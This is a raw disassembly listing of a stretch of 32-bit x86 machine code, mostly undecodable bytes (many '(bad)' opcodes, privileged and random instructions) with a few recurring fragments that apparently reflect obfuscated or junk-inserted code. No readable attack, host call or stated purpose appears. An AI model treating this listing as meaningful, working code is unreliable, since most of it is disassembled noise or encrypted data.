  408a88:	mov    dl,0x65
  408a8a:	inc    edi
  408a8b:	test   ch,0x2a
  408a8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a8f:	lds    ebx,FWORD PTR [edi]
  408a91:	sbb    ebx,DWORD PTR [edx-0x4e40b906]
  408a97:	out    0x22,al
  408a99:	cmp    BYTE PTR [ebx*2+0x240db79a],ah
  408aa0:	(bad)  
  408aa2:	mov    cl,0xe7
  408aa4:	mov    ebp,0xbcf0156c
  408aa9:	cmp    BYTE PTR [edi-0x4d],0xda
  408aad:	mov    ah,0x68
  408aaf:	xchg   DWORD PTR [ecx-0x58aa6dc],ecx
  408ab5:	frstor [edx-0x60]
  408ab8:	sar    DWORD PTR [esi-0x21],cl
  408abb:	es mov dl,0xe3
  408abe:	gs test eax,0x85b8796e
  408ac4:	mov    bh,0xe3
  408ac6:	jp     0x408a98
  408ac8:	jmp    0xbaf0e2dd
  408acd:	scas   eax,DWORD PTR es:[edi]
  408ace:	mov    bh,0x9b
  408ad0:	fdivr  DWORD PTR [esi]
  408ad2:	mov    ch,0x9
  408ad4:	aad    0x61
  408ad6:	ins    DWORD PTR es:[edi],dx
  408ad7:	push   esi
  408ad8:	pop    edx
  408ad9:	pop    esi
  408ada:	push   0x813351b8
  408adf:	xchg   ebx,eax
  408ae0:	pop    edi
  408ae1:	cld    
  408ae2:	fisub  DWORD PTR [eax]
  408ae4:	mov    ebp,0x29280d91
  408ae9:	sbb    DWORD PTR [ebp+ecx*8-0x104d1cf5],0x20
  408af1:	aam    0x1f
  408af3:	dec    eax
  408af4:	lahf   
  408af5:	xchg   DWORD PTR [ebx],ebp
  408af7:	pushaw 
  408af9:	outs   dx,BYTE PTR ds:[esi]
  408afa:	mov    bh,0x7b
  408afc:	mov    eax,0x69e1f37a
  408b01:	mov    cl,0x89
  408b03:	and    eax,0xf46f2260
  408b08:	mov    ch,0x23
  408b0a:	jns    0x408aa4
  408b0c:	xor    esp,esi
  408b0e:	inc    esp
  408b0f:	add    esp,esi
  408b11:	push   0x27b3bf0a
  408b16:	sub    al,0x1f
  408b18:	push   es
  408b19:	dec    ecx
  408b1a:	imul   esi,eax,0xfffffffd
  408b1d:	das    
  408b1e:	ss pop ss
  408b20:	mov    eax,ds:0x12b7f482
  408b25:	and    ebx,eax
  408b27:	jmp    0xc7a0:0xa63a18b1
  408b2e:	inc    ebp
  408b2f:	or     bl,dl
  408b31:	dec    edi
  408b32:	jmp    0x408b1f
  408b34:	mov    eax,0xffffdedc
  408b39:	jmp    0x408c11
  408b3e:	jecxz  0x408b44
  408b40:	outs   dx,BYTE PTR ds:[esi]
  408b41:	loope  0x408b32
  408b43:	jmp    0x408b34
  408b45:	push   es
  408b46:	adc    al,0x68
  408b48:	xor    eax,0x2cd6e338
  408b4d:	int3   
  408b4e:	mov    edx,DWORD PTR [edx+0x0]
  408b51:	add    BYTE PTR [ebx-0x6e000000],bh
  408b57:	ret    0x3766
  408b5a:	sbb    eax,0x5dbb7cc0
  408b5f:	adc    edi,DWORD PTR [edi-0x7fa8d1ae]
  408b65:	push   ss
  408b66:	(bad)  [edi+eiz*8+0x4cca4216]
  408b6d:	cld    
  408b6e:	bnd jbe 0x408b80
  408b71:	or     al,BYTE PTR [edx+0xc]
  408b74:	sub    DWORD PTR [edi-0x38c4f686],ebp
  408b7a:	clts   
  408b7c:	pop    edi
  408b7d:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  408b7f:	pop    ss
  408b80:	mov    ebx,0x74c7da56
  408b85:	pop    esp
  408b86:	jb     0x408b0a
  408b88:	ds shl esp,1
  408b8b:	or     DWORD PTR [ebx],ebp
  408b8d:	add    DWORD PTR [ebp-0x4d48eaa9],ebp
  408b93:	add    DWORD PTR [ebp-0xf],ebx
  408b96:	cmc    
  408b97:	or     eax,0x3492b0d6
  408b9c:	jae    0x408bd8
  408b9e:	loop   0x408b6c
  408ba0:	imul   edi,edx,0x98dc5079
  408ba6:	cwde   
  408ba7:	mov    bh,0xa2
  408ba9:	clc    
  408baa:	data16 mov dh,0x7a
  408bad:	add    eax,0x6f5929cd
  408bb2:	sub    eax,0x5fcd7845
  408bb7:	cmp    DWORD PTR [ebx+esi*1-0x14],ebp
  408bbb:	sub    dh,dl
  408bbd:	(bad)  
  408bbe:	(bad)  
  408bc0:	mov    esp,?
  408bc2:	outs   dx,BYTE PTR ds:[esi]
  408bc3:	cmp    bl,bh
  408bc5:	fidivr DWORD PTR [esp+esi*8+0x38]
  408bc9:	mov    ebp,0x8636287e
  408bce:	jmp    0x366055af
  408bd3:	xor    eax,0x3ea9babd
  408bd8:	iret   
  408bd9:	adc    esi,esp
  408bdb:	fild   DWORD PTR [edx+0x36f13860]
  408be1:	or     bh,BYTE PTR [eax+esi*1]
  408be4:	sub    eax,DWORD PTR ds:0xd71abddc
  408bea:	mov    ch,0x53
  408bec:	dec    esi
  408bed:	ins    BYTE PTR es:[edi],dx
  408bee:	mov    al,BYTE PTR [ebp-0x7]
  408bf1:	ret    0x454c
  408bf4:	sti    
  408bf5:	fisubr WORD PTR [eax]
  408bf7:	push   ds
  408bf8:	fild   QWORD PTR [edx]
  408bfa:	jmp    0x8da3b910
  408bff:	push   cs
  408c00:	das    
  408c01:	ins    BYTE PTR es:[edi],dx
  408c02:	jecxz  0x408bbc
  408c04:	fnstcw WORD PTR [edi+ebp*8+0x544a4fff]
  408c0b:	lahf   
  408c0c:	inc    ebx
  408c0d:	cld    
  408c0e:	in     al,dx
  408c0f:	mov    edi,0xc45898c
  408c14:	mov    DWORD PTR [ebp+0x18],0xebeb4fd4
  408c1b:	jmp    0x408cf3
  408c20:	or     BYTE PTR [edx+0x67],bh
  408c23:	ins    DWORD PTR es:[edi],dx
  408c24:	ja     0x408ca3
  408c26:	or     bh,BYTE PTR [edi-0x66]
  408c29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c2a:	sti    
  408c2b:	xor    esp,DWORD PTR [ebx+0x46a4406a]
  408c31:	push   ebx
  408c32:	add    BYTE PTR [eax],al
  408c34:	mov    ebx,0xbb000000
  408c39:	pop    esp
  408c3a:	jo     0x408cb2
  408c3c:	lahf   
  408c3d:	inc    edi
  408c3e:	jmp    0x7fc61e
  408c43:	push   es
  408c44:	mov    ch,0xce
  408c46:	mul    dh
  408c48:	and    eax,0x3064291f
  408c4d:	cmc    
  408c4e:	add    cl,BYTE PTR [edi]
  408c50:	mov    BYTE PTR [eax-0x7e],ch
  408c53:	imul   eax,eax,0x33
  408c56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c57:	es es adc al,0x9
  408c5b:	mov    dl,0x84
  408c5d:	iret   
  408c5e:	inc    ecx
  408c5f:	inc    esp
  408c60:	mov    edi,0xf64aa7d4
  408c65:	je     0x408c16
  408c67:	test   DWORD PTR [bx+0x78],eax
  408c6b:	mov    eax,0x70a7ce28
  408c70:	ja     0x408cb8
  408c72:	and    BYTE PTR [ebx-0x38],0x15
  408c76:	mov    eax,ds:0xf711bf8f
  408c7b:	adc    DWORD PTR [eax+eax*2-0x686ec465],ecx
  408c82:	inc    eax
  408c83:	retf   
  408c84:	std    
  408c85:	int3   
  408c86:	cmp    ebp,DWORD PTR [esi-0x45756d1f]
  408c8c:	aam    0x24
  408c8e:	imul   esi,DWORD PTR [ebp-0x69],0x7eabc919
  408c95:	adc    ebx,DWORD PTR [ebp-0xc3b02b8]
  408c9b:	or     ecx,DWORD PTR [edi+eiz*1-0x7e]
  408c9f:	cwde   
  408ca0:	(bad)  
  408ca2:	sar    BYTE PTR [eax-0x6d],1
  408ca5:	sub    dh,cl
  408ca7:	or     eax,0x17b37a5b
  408cac:	mov    al,ds:0xa237dc5e
  408cb1:	xor    ebp,DWORD PTR [esi+esi*8]
  408cb4:	test   al,0x94
  408cb6:	xor    ah,BYTE PTR [eax+0x7b4b1eef]
  408cbc:	(bad)  
  408cbd:	fistp  WORD PTR [edi+0x7b]
  408cc0:	fst    QWORD PTR [esi+ebp*4]
  408cc3:	xchg   esi,eax
  408cc4:	mov    eax,ds:0x176659df
  408cc9:	addr16 cmp eax,0xe874151c
  408ccf:	aas    
  408cd0:	mov    dh,0x62
  408cd2:	imul   esi,DWORD PTR [edi+0x53be4abb],0x5b
  408cd9:	xchg   ebp,eax
  408cda:	shl    DWORD PTR [edx],0x2c
  408cdd:	sbb    DWORD PTR [ebx-0x1f141640],ebx
  408ce3:	imul   edi,esi,0xffffff85
  408ce6:	push   ds
  408ce7:	les    edi,FWORD PTR [esi+0x75d49079]
  408ced:	js     0x408d24
  408cef:	adc    eax,0x89e58f6f
  408cf4:	inc    ebp
  408cf5:	sbb    al,0xe9
  408cf7:	rol    DWORD PTR [eax],cl
  408cf9:	add    BYTE PTR [eax],al
  408cfb:	outs   dx,DWORD PTR ds:[esi]
  408cfc:	call   ebp
  408cfe:	xor    al,0xd5
  408d00:	ds out dx,eax
  408d02:	call   FWORD PTR [edx+0x2dc30dbf]
  408d08:	pop    ebx
  408d09:	jp     0x408cd8
  408d0b:	add    DWORD PTR [eax+eax*1+0x0],edx
  408d0f:	mov    ebx,0xb5000000
  408d14:	lods   eax,DWORD PTR ds:[esi]
  408d15:	xor    eax,0x3de4a665
  408d1a:	fild   DWORD PTR [ecx-0x17]
  408d1d:	jg     0x408d48
  408d1f:	out    0xc5,eax
  408d21:	inc    ebp
  408d22:	jnp    0x408d90
  408d24:	aas    
  408d25:	pop    ecx
  408d26:	outs   dx,DWORD PTR ds:[esi]
  408d27:	sub    BYTE PTR [ebx+0x4e],0x8f
  408d2b:	jle    0x408d99
  408d2d:	sub    DWORD PTR [esi],edx
  408d2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d30:	fstp   QWORD PTR [ebp+0x5006bc29]
  408d36:	xor    bl,BYTE PTR [ebp+0x25]
  408d39:	mov    dl,0x41
  408d3b:	dec    eax
  408d3c:	xchg   ecx,eax
  408d3d:	add    BYTE PTR [ebx-0xcf0062],bl
  408d43:	sub    eax,0x7734d229
  408d48:	push   cs
  408d49:	enter  0x6697,0x9
  408d4d:	or     DWORD PTR [eax-0x794c56a5],0x9b07ef52
  408d57:	adc    BYTE PTR [ecx-0x63],al
  408d5a:	call   0xea1500df
  408d5f:	lock das 
  408d61:	imul   ecx,DWORD PTR [ecx+0x41dd6ab9],0xffffffd4
  408d68:	int    0x1b
  408d6a:	mov    al,0x88
  408d6c:	cmc    
  408d6d:	vcmpss xmm1,xmm0,xmm6,0xf7
  408d72:	(bad)  
  408d73:	jae    0x408d41
  408d75:	iret   
  408d76:	(bad)  
  408d77:	cmp    BYTE PTR [ebx+edi*1+0x78],al
  408d7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d7c:	add    eax,0x86e997ef
  408d81:	xchg   esp,eax
  408d82:	gs stos DWORD PTR es:[edi],eax
  408d84:	out    0x61,al
  408d86:	ret    
  408d87:	pop    ds
  408d88:	stc    
  408d89:	xchg   DWORD PTR [edx+ebx*8-0x1f],esp
  408d8d:	pop    es
  408d8e:	call   0xeb89:0x616f24ab
  408d95:	sbb    ecx,DWORD PTR [edx-0x289ad243]
  408d9b:	or     eax,0xd05c3235
  408da0:	xchg   edx,eax
  408da1:	add    dh,BYTE PTR [esi+0x288d7201]
  408da7:	adc    BYTE PTR [edi-0x27609451],dh
  408dad:	mov    eax,ds:0x95df6ef6
  408db2:	xchg   DWORD PTR [edi],esp
  408db4:	xchg   ecx,eax
  408db5:	adc    esp,DWORD PTR [eax-0x7198adec]
  408dbb:	das    
  408dbc:	jge    0x408d84
  408dbe:	push   ebx
  408dbf:	pushf  
  408dc0:	dec    ebp
  408dc1:	inc    edx
  408dc2:	scas   al,BYTE PTR es:[edi]
  408dc3:	icebp  
  408dc4:	add    BYTE PTR [ebx-0x2117076],bh
  408dca:	and    DWORD PTR [ecx+edx*2-0x37ba38ff],edx
  408dd1:	aad    0x4f
  408dd3:	jmp    0x408dc0
  408dd5:	mov    DWORD PTR [ebp-0x34],eax
  408dd8:	mov    DWORD PTR [ebp-0x28],0xebeb4fd6
  408ddf:	mov    DWORD PTR [ebp-0x24],eax
  408de2:	mov    eax,DWORD PTR [ebp+0x8]
  408de5:	jmp    0x408ebd
  408dea:	inc    edx
  408dec:	(bad)  
  408dee:	std    
  408def:	(bad)  
  408df0:	inc    edx
  408df2:	fwait
  408df3:	add    edx,DWORD PTR [edx-0x5f]
  408df6:	inc    esi
  408df7:	cmp    ebp,edi
  408df9:	pop    edi
  408dfa:	mov    esp,0xbb000054
  408dff:	add    BYTE PTR [eax],al
  408e01:	add    BYTE PTR ds:0x904c3366,ah
  408e07:	xchg   edi,eax
  408e08:	mul    BYTE PTR [ebp+ebx*2-0x1b2c596a]
  408e0f:	xchg   BYTE PTR [esi-0x5c22c1f],bl
  408e15:	jmp    0x19cc:0x4fe2bd7b
  408e1c:	ins    BYTE PTR es:[edi],dx
  408e1d:	js     0x408e7a
  408e1f:	inc    esi
  408e20:	mov    dh,0x1d
  408e22:	mov    cl,0xe1
  408e24:	out    dx,eax
  408e25:	mov    esi,0xc970313b
  408e2a:	push   edx
  408e2b:	adc    eax,0x905a34b1
  408e30:	dec    eax
  408e31:	retf   0x7abd
  408e34:	sbb    eax,0xbea1d48c
  408e39:	mov    eax,ds:0xe13fe8a7
  408e3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e3f:	xlat   BYTE PTR ds:[ebx]
  408e40:	fld    QWORD PTR [edx-0x24d1be1e]
  408e46:	cdq    
  408e47:	data16 sti 
  408e49:	or     BYTE PTR [edx+0x57],al
  408e4c:	pushf  
  408e4d:	dec    ebx
  408e4e:	sbb    ah,al
  408e50:	enter  0xadac,0xd7
  408e54:	mov    ebx,0x6707457a
  408e59:	sar    BYTE PTR [ebx+ebp*8],0x1c
  408e5d:	dec    edi
  408e5e:	addr16 dec esp
  408e60:	xchg   ebx,eax
  408e61:	inc    ebx
  408e62:	or     dl,cl
  408e64:	rol    DWORD PTR [eax+ecx*4-0x3b3035e1],0xe8
  408e6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e6d:	mov    ecx,0xb92e4e56
  408e72:	push   esp
  408e73:	clc    
  408e74:	push   ss
  408e75:	rol    DWORD PTR [edx],cl
  408e77:	clc    
  408e78:	mov    bl,0xbc
  408e7a:	popf   
  408e7b:	(bad)  
  408e7c:	jne    0x408e53
  408e7e:	(bad)  
  408e7f:	mov    eax,ds:0xe2c634dd
  408e84:	les    edi,FWORD PTR [edi]
  408e86:	jl     0x408eb7
  408e88:	ins    BYTE PTR es:[edi],dx
  408e89:	mov    al,BYTE PTR [eax+0x33]
  408e8c:	xchg   ebx,eax
  408e8d:	imul   esp,DWORD PTR [esi],0xffffffcb
  408e90:	fmulp  st(5),st
  408e92:	stos   BYTE PTR es:[edi],al
  408e93:	mov    eax,0x62d5f30d
  408e98:	test   BYTE PTR [ecx],ah
  408e9a:	mov    ds:0x74e0e86c,al
  408e9f:	out    0x98,eax
  408ea1:	je     0x408e66
  408ea3:	(bad)  
  408ea4:	shl    DWORD PTR [ebp-0x4d],cl
  408ea7:	pop    ss
  408ea8:	leave  
  408ea9:	ss adc eax,0x80d452f0
  408eaf:	mov    eax,0x4f696b09
  408eb4:	mov    fs,WORD PTR [ebx]
  408eb6:	mov    eax,ds:0xdcfa0145
  408ebb:	fiadd  WORD PTR [ebx]
  408ebd:	mov    edx,DWORD PTR [ebp+0xc]
  408ec0:	mov    edx,DWORD PTR ds:0x4331d4
  408ec6:	xor    eax,esi
  408ec8:	jmp    0x408fa0
  408ecd:	mov    edi,0x7fae7bc9
  408ed2:	mov    esi,0xdff3d9ff
  408ed7:	mov    dl,0x33
  408ed9:	push   0xfffffff2
  408edb:	(bad)  
  408edc:	lahf   
  408edd:	ja     0x408f34
  408edf:	add    BYTE PTR [eax],al
  408ee1:	mov    ebx,0x30000000
  408ee6:	jmp    0x408eef
  408ee8:	and    dl,BYTE PTR [ebp-0x774373e]
  408eee:	xor    DWORD PTR [ecx+ecx*4],edi
  408ef1:	loope  0x408f5c
  408ef3:	aad    0xee
  408ef5:	es cmp eax,0xdb5bc3a4
  408efb:	retf   
  408efc:	mov    edi,0x101b29dd
  408f01:	retf   0x9eab
  408f04:	add    eax,0x5f9897e5
  408f09:	loopne 0x408ebd
  408f0b:	and    bl,0x3
  408f0e:	(bad)  
  408f0f:	ss push ds
  408f11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f12:	lods   al,BYTE PTR ds:[esi]
  408f13:	ss cli 
  408f15:	sub    DWORD PTR [eax],0xfe16fa83
  408f1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f1c:	sbb    BYTE PTR ds:0xe07b6c92,bl
  408f22:	jg     0x408ee0
  408f24:	aaa    
  408f25:	hlt    
  408f26:	pop    esp
  408f27:	jnp    0x408f96
  408f29:	pop    edx
  408f2a:	(bad)  
  408f2b:	jnp    0x408ebd
  408f2d:	in     eax,dx
  408f2e:	pop    esp
  408f2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f30:	gs jle 0x408f29
  408f33:	xchg   esp,eax
  408f34:	ja     0x408ee0
  408f36:	xchg   edi,eax
  408f37:	jae    0x408f67
  408f39:	pop    ebp
  408f3a:	dec    ecx
  408f3b:	or     eax,0x71794e97
  408f40:	not    DWORD PTR [eax+0x75]
  408f43:	repnz mov ah,0x10
  408f46:	xchg   DWORD PTR [edx],esp
  408f48:	cmp    eax,0x366ed366
  408f4d:	adc    DWORD PTR [eax],edx
  408f4f:	add    eax,0xbc22fec9
  408f54:	pusha  
  408f55:	(bad)  
  408f57:	sub    DWORD PTR [ebx+0x19],esp
  408f5a:	mov    dh,BYTE PTR [ebx]
  408f5c:	jnp    0x408fdd
  408f5e:	loope  0x408fa5
  408f60:	data16 int3 
  408f62:	inc    edx
  408f63:	arpl   WORD PTR [ecx+0x6d],si
  408f66:	retf   
  408f67:	pop    ebp
  408f68:	jno    0x408f1f
  408f6a:	fld    DWORD PTR [edx]
  408f6c:	adc    bh,BYTE PTR [eax*8-0x10d77521]
  408f73:	jecxz  0x408f21
  408f75:	or     esi,ecx
  408f77:	fsubr  DWORD PTR [ebp-0x1a2f188a]
  408f7d:	dec    edx
  408f7e:	xchg   ebp,eax
  408f7f:	sub    dl,dl
  408f81:	pop    ds
  408f82:	dec    ebp
  408f83:	pop    es
  408f84:	cmp    DWORD PTR [edi-0x381716a7],eax
  408f8a:	xlat   BYTE PTR ds:[ebx]
  408f8b:	sbb    dl,ch
  408f8d:	bnd jl 0x408fb9
  408f90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f91:	xor    al,BYTE PTR [edx-0x6f]
  408f94:	fcmovu st,st(0)
  408f96:	push   esi
  408f97:	xchg   ebx,eax
  408f98:	aas    
  408f99:	mov    cl,0xc5
  408f9b:	xchg   dl,dl
  408f9d:	push   ebx
  408f9e:	cld    
  408f9f:	imul   ecx,DWORD PTR [ebp+0x624d1084],0x458999b8
  408fa9:	adc    BYTE PTR [ebx+0x558b0845],cl
  408faf:	or     al,0x33
  408fb1:	(bad)  
  408fb2:	jmp    0x40908a
  408fb7:	jbe    0x409010
  408fb9:	enter  0xe903,0x9f
  408fbd:	push   DWORD PTR [edi-0x28]
  408fc0:	push   es
  408fc1:	inc    eax
  408fc2:	cmp    BYTE PTR [eax+0x323390bc],dh
  408fc8:	push   esi
  408fc9:	add    BYTE PTR [eax],al
  408fcb:	mov    ebx,0xe8000000
  408fd0:	(bad)  
  408fd1:	std    
  408fd2:	test   eax,0x627d8cfe
  408fd7:	out    dx,al
  408fd8:	outs   dx,BYTE PTR ds:[esi]
  408fd9:	pushf  
  408fda:	push   eax
  408fdb:	mov    bh,0xb6
  408fdd:	int3   
  408fde:	adc    al,BYTE PTR [eax]
  408fe0:	lods   eax,DWORD PTR ds:[esi]
  408fe1:	stos   DWORD PTR es:[edi],eax
  408fe2:	dec    edx
  408fe3:	dec    ebx
  408fe4:	imul   ecx,DWORD PTR [ebx-0x912d40a],0x66
  408feb:	adc    BYTE PTR [ecx-0x53],0x4f
  408fef:	xchg   edi,eax
  408ff0:	or     bl,bh
  408ff2:	not    BYTE PTR [edi-0x1706442d]
  408ff8:	push   0x5b
  408ffa:	sar    DWORD PTR [eax+edx*2],0xe5
  408ffe:	cmc    
  408fff:	ja     0x408fe8
  409001:	mov    ah,0xa0
  409003:	mov    ?,WORD PTR [edx]
  409005:	fxsave [eax-0x45]
  409009:	in     al,dx
  40900a:	call   0x276a:0xe55044e5
  409011:	pop    eax
  409012:	or     al,0xcc
  409014:	cmp    dh,BYTE PTR ds:0xff749713
  40901a:	iret   
  40901b:	sbb    ah,BYTE PTR [edi]
  40901d:	(bad)  
  40901e:	ins    BYTE PTR es:[edi],dx
  40901f:	fcomp  DWORD PTR [ebx+0x4a]
  409022:	dec    edx
  409023:	test   eax,0xa3e4e174
  409028:	pop    ds
  409029:	inc    ecx
  40902a:	xor    DWORD PTR [ecx],eax
  40902c:	aas    
  40902d:	rcr    BYTE PTR [eax],1
  40902f:	mov    eax,0xb21ef9d6
  409034:	sbb    eax,0x4cfcbbb
  409039:	gs inc edi
  40903b:	repz and eax,0x438de5d2
  409041:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409042:	int    0x8e
  409044:	jo     0x4090a8
  409046:	mov    al,0x5b
  409048:	cmp    al,0x10
  40904a:	sar    BYTE PTR [eax],0x71
  40904d:	jmp    0xab25:0x2cd2c709
  409054:	std    
  409055:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409056:	cwde   
  409057:	mov    ds:0x8aa1f65a,al
  40905c:	mov    esp,0x88b002a6
  409061:	dec    ebp
  409062:	add    eax,0xa35ed888
  409067:	imul   ebx,DWORD PTR [esp+ebx*4-0x6e092d73],0x6fe1b565
  409072:	inc    esp
  409073:	test   DWORD PTR [edx],esi
  409075:	cdq    
  409076:	(bad)  
  409077:	push   DWORD PTR [eax]
  409079:	push   ds
  40907a:	mov    ecx,es
  40907c:	mov    esp,0xd86b5dbc
  409081:	push   edi
  409082:	and    DWORD PTR [ebx+0x4c],edi
  409085:	xor    BYTE PTR [edi-0x75a59141],dl
  40908b:	xchg   esp,eax
  40908c:	add    eax,0x99b86249
  409091:	jmp    0x409169
  409096:	mov    eax,ds:0xfaf0f02b
  40909b:	sti    
  40909c:	mov    eax,ds:0x94f2aa7b
  4090a1:	lahf   
  4090a2:	adc    edx,edi
  4090a4:	fisttp DWORD PTR [esi-0x13]
  4090a7:	push   esi
  4090a8:	add    BYTE PTR [eax],al
  4090aa:	mov    ebx,0xb0000000
  4090af:	add    ecx,edi
  4090b1:	dec    esi
  4090b2:	mov    ?,WORD PTR [esi-0x35]
  4090b5:	jecxz  0x409042
  4090b7:	and    al,0x3
  4090b9:	in     eax,dx
  4090ba:	je     0x40907b
  4090bc:	jo     0x4090f2
  4090be:	and    al,0x16
  4090c0:	ins    BYTE PTR es:[edi],dx
  4090c1:	xchg   DWORD PTR [ebp+0x4d],ebp
  4090c4:	jno    0x4090cc
  4090c6:	push   ebp
  4090c7:	jl     0x4090b1
  4090c9:	and    DWORD PTR [ebp+0x5de2485e],esi
  4090cf:	add    ch,BYTE PTR [edi-0x548409c1]
  4090d5:	mov    al,dh
  4090d7:	data16 fcomp QWORD PTR [edi]
  4090db:	and    BYTE PTR [esi-0x70],bl
  4090de:	mov    cl,0x22
  4090e0:	push   es
  4090e1:	and    eax,0x54e9ce5b
  4090e6:	xchg   bh,ch
  4090e8:	arpl   WORD PTR [ebx+edx*2],cx
  4090eb:	loopne 0x409095
  4090ed:	pushf  
  4090ee:	mov    edx,0x7faef92d
  4090f3:	jmp    0x4090a1
  4090f5:	pop    esp
  4090f7:	mov    DWORD PTR [ebx],edx
  4090f9:	mov    edx,esp
  4090fb:	mov    ebp,ebx
  4090fd:	shl    esi,1
  4090ff:	call   0xd807:0xf46ffb25
  409106:	inc    DWORD PTR [eax-0x7b3743cc]
  40910c:	retf   
  40910d:	pop    esi
  40910e:	xchg   ecx,eax
  40910f:	popa   
  409110:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409111:	scas   al,BYTE PTR es:[edi]
  409112:	fst    QWORD PTR [ebx+0x70]
  409115:	inc    esi
  409116:	inc    ebp
  409117:	(bad)  
  409118:	xchg   edi,eax
  409119:	add    BYTE PTR [edx+0x7269e65c],bl
  40911f:	cwde   
  409120:	lahf   
  409121:	jo     0x40914c
  409123:	and    edi,eax
  409125:	xor    BYTE PTR [ebx+0x60],0xb1
  409129:	int3   
  40912a:	jmp    0x40917d
  40912c:	dec    ecx
  40912d:	add    esp,edi
  40912f:	mov    ?,ebx
  409131:	lea    ecx,[esi+eiz*2]
  409134:	ror    DWORD PTR [esi+0x2723c977],cl
  40913a:	js     0x40918a
  40913c:	jecxz  0x4091aa
  40913e:	inc    esp
  40913f:	xor    edi,DWORD PTR [edx]
  409141:	cmp    BYTE PTR [edx-0x4],bh
  409144:	imul   eax,DWORD PTR [eax+edi*4+0x4a],0x9e2c32c
  40914c:	lods   eax,DWORD PTR ds:[esi]
  40914d:	dec    ebp
  40914e:	in     eax,0x61
  409150:	push   esp
  409151:	int3   
  409152:	leave  
  409153:	mov    esi,0x6b5b476d
  409158:	pushf  
  409159:	repz mov gs,WORD PTR cs:[edx]
  40915d:	sbb    ah,BYTE PTR [ebx]
  40915f:	and    edi,DWORD PTR [esi-0x5a]
  409162:	jno    0x409134
  409164:	mov    dh,0xc
  409166:	(bad)  [edx-0x63]
  409169:	mov    eax,DWORD PTR [ebp+0x10]
  40916c:	xor    BYTE PTR [eax],dl
  40916e:	jmp    0x409246
  409173:	push   eax
  409174:	or     eax,DWORD PTR [ecx+0x17]
  409177:	pop    ebx
  409178:	pop    edi
  409179:	push   esi
  40917a:	dec    edi
  40917b:	sub    BYTE PTR [edx+0x55],dl
  40917e:	addr16 push esi
  409180:	in     eax,0xdb
  409182:	fisubr WORD PTR [eax-0x44ffffa9]
  409188:	add    BYTE PTR [eax],al
  40918a:	add    dl,al
  40918c:	in     eax,0x8
  40918e:	xlat   BYTE PTR ds:[ebx]
  40918f:	loop   0x4091a3
  409191:	adc    al,0x99
  409193:	or     edi,DWORD PTR [ebx-0x4d]
  409196:	pushf  
  409197:	jnp    0x409164
  409199:	out    0x5c,al
  40919b:	sbb    edi,0xffffffc9
  40919e:	sbb    al,0x16
  4091a0:	jg     0x409169
  4091a2:	std    
  4091a3:	pop    esi
  4091a4:	jp     0x40914d
  4091a6:	jge    0x4091d6
  4091a8:	jmp    0x4091cc
  4091aa:	fnstenv [ebx]
  4091ac:	ins    BYTE PTR es:[edi],dx
  4091ad:	ret    
  4091ae:	add    dh,ch
  4091b0:	xchg   edx,eax
  4091b1:	out    0x1f,al
  4091b3:	mov    al,0xab
  4091b5:	xchg   edx,eax
  4091b6:	adc    eax,0xfffffff6
  4091b9:	into   
  4091ba:	jo     0x4091f9
  4091bc:	loopne 0x409171
  4091be:	mov    ah,0x46
  4091c0:	mov    bl,0xb5
  4091c2:	loop   0x409174
  4091c4:	in     eax,dx
  4091c5:	loop   0x409238
  4091c7:	push   esp
  4091c8:	pop    eax
  4091c9:	div    dh
  4091cb:	aaa    
  4091cc:	cmp    al,0x33
  4091ce:	call   0xbaafa8d6
  4091d3:	push   es
  4091d4:	dec    ebp
  4091d5:	inc    edi
  4091d6:	in     al,dx
  4091d7:	popa   
  4091d8:	mov    ebp,0xf0cd45c5
  4091dd:	repz push 0xffffff9a
  4091e0:	mov    ebx,0xd9e10962
  4091e5:	leave  
  4091e6:	out    dx,eax
  4091e7:	add    cl,ch
  4091e9:	inc    ebp
  4091ea:	cmp    esi,DWORD PTR [ebx-0x1459e01b]
  4091f0:	sub    al,0x4b
  4091f2:	retf   0xbb10
  4091f5:	repnz xchg esp,eax
  4091f7:	mov    eax,0x90d25d08
  4091fc:	xchg   edx,eax
  4091fd:	bnd jno 0x4091fb
  409200:	cmc    
  409201:	in     eax,dx
  409202:	pop    edx
  409204:	pop    eax
  409205:	or     eax,0xf218791a
  40920a:	popf   
  40920b:	pusha  
  40920c:	mov    eax,ds:0xe0b6fd59
  409211:	add    BYTE PTR [eax+edx*2-0x3f],dl
  409215:	xor    ebp,DWORD PTR [esi+0x167f0a86]
  40921b:	repz xchg esp,eax
  40921d:	xor    cl,BYTE PTR [edi-0xb]
  409220:	in     al,dx
  409221:	jp     0x409223
  409223:	(bad)  
  409224:	xchg   ebp,eax
  409225:	jbe    0x409260
  409227:	add    al,0xd3
  409229:	inc    eax
  40922a:	pop    ebp
  40922b:	pop    esi
  40922c:	adc    eax,0x5ce387a
  409231:	xor    ah,BYTE PTR [eax+0x67050373]
  409237:	outs   dx,BYTE PTR ds:[esi]
  409238:	out    0x2,al
  40923a:	gs cmp eax,0xbda58dba
  409240:	push   0xeca02d74
  409245:	fwait
  409246:	mov    eax,DWORD PTR [ebp+0x18]
  409249:	mov    edx,DWORD PTR [ebp+0x1c]
  40924c:	mov    edx,DWORD PTR ds:0x4331d4
  409252:	xor    eax,esi
  409254:	jmp    0x40932c
  409259:	xchg   esp,eax
  40925a:	sub    BYTE PTR [edi-0xa004026],0xce
  409261:	test   dh,ch
  409263:	xchg   esi,eax
  409264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409265:	mov    edx,0x6302de15
  40926a:	pop    eax
  40926b:	add    BYTE PTR [eax],al
  40926d:	mov    ebx,0x4c000000
  409272:	pop    ecx
  409273:	icebp  
  409274:	add    BYTE PTR [ebx],bh
  409276:	fs loop 0x4092ba
  409279:	pop    edi
